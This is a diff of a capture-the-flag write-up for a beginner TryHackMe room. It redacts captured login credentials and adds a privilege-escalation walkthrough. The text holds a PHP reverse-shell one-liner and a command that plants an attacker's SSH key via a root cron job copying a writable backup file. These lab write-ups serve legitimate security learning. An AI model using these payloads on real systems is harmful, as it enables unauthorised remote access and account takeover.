@@ -7,7 +7,8 @@
   ,-'   | ||    ||  /,-. |'.   \) \    '.   \) \(/  \)'. `---' .` )/      )/ '. `---' .` 
  (_..--' (_/    \_)-'   ''  `-.(_.'      `-.(_.' )      `-...-'  (       (     `-...-'
 ```
-Follow the yellow brick road. [^1]
+Smag Grotto is a challenge offered on TryHackMe, aimed at beginners.
+It tells us to follow the yellow brick road. [^1]
 
 What is the user flag?
 -----------------------------------------------------------------------------------------
@@ -27,15 +28,15 @@ and that all attachments must be downloaded with `wget`. Additionally, the *Netw
 Mitigation* email reply includes a PCAP file documenting a network change. So, we proceed
 to investigate the `dHJhY2Uy.pcap` file and find only ten packets. Packet four, in
 particular gives us useful information about a `/login.php` page with sensitive user
-credentials as follows in an excerpt from the HTTP protocol and form data.
+credentials in an excerpt from the HTTP protocol and form data.
 ```
 Hypertext Transfer Protocol
     POST /login.php HTTP/1.1\r\n
     Host: development.smag.thm\r\n
     <--snip-->
 HTML Form URL Encoded: application/x-www-form-urlencoded
-    Form item: "username" = "helpdesk"
-    Form item: "password" = "cH4nG3M3_n0w"
+    Form item: "username" = "<REDACTED>"
+    Form item: "password" = "<REDACTED>"
 ```
 Note, that before we can access the server `http://development.smag.thm/login.php`, we
 first need to edit the `/etc/hosts` file to include the following entry with the
@@ -52,12 +53,34 @@ php -r '$sock=fsockopen("<TARGET_IP_ADDRESS>",<PORT>);system("sh <&3 >&3 2>&3");
 ```
 Thust, we get a reverse shell connection on our listener and are able to enter commands.
 Navigating the home directory, we discover a user *jake* with a `user.txt` file.
-However, we can not access it because we are logged in as *www-data*.
+However, we can not access it because we are logged in as *www-data*. After looking
+around the VM directory for a while, we notice a clue in the `/etc/crontab` file.
+```
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
-TBC
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*  *    * * *   root	/bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
+```
+The last line comes in handy, because it runs `cat` to copy the contents of the public
+SSH key into the `authorized_keys` file to authenticate as the user *jake* via SSH. This
+is exactly what we want to use, as we can print the contents of the backup file with our
+unprivileged user through `cat /opt/.backups/jake_id_rsa.pub.backup`. Moreover, we can
+modify the backup file and grant ourselves access via SSH as the user *jake*. For, that
+we create a new SSH key in our attacking machine with `ssh-keygen` and copy the public
+key for the *cronjob* to copy into jake's authorized keys:
+`echo "<ATTACKING_PUBLIC_SSH_KEY>" > /opt/.backups/jake_id_rsa.pub.backup`.
+And indeed, after verifying that our public key is stored in the backup file, we can
+proceed to log in as *jake* on the attacking machine with `ssh jake@<TARGET_IP_ADDRESS>`
+and are able to log in. Finally, we can print the contents of the `user.txt` file.
 
 What is the root flag?
 -----------------------------------------------------------------------------------------
 
 [^1]: https://tryhackme.com/room/smaggrotto
 [^2]: https://www.revshells.com/
+[^3]: https://gtfobins.org/gtfobins/apt-get/
